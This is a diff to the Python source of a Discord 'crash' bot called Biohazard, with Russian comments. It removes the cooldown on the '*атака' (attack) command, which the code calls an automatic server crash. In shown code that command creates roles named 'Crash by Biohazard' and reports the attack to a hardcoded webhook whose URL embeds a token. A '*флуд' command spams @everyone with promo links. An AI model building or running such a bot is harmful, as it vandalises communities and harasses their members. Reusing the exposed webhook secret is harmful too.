@@ -7,7 +7,6 @@ import time
 token = os.environ.get('TOKENZ') #токен
 from discord_webhook import DiscordWebhook
 print('Ожидание входа...')
-cooldown = 0
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
@@ -131,10 +130,8 @@ class MyClient(discord.Client):
 					f.truncate()
 				await message.author.send(':white_check_mark:')
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
-			if message.content == '*атака' and cooldown != 1: #автоматический краш
-				cooldown = 1
+			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
-				await message.author.send('Команда будет доступна через 1 минуту [для всех]')
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
 				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
@@ -185,9 +182,6 @@ class MyClient(discord.Client):
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
 				except:
 					pass
-				
-				time.sleep(60)
-				cooldown = 0
 				
 			if message.content == '*флуд': #флуд
 				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8'
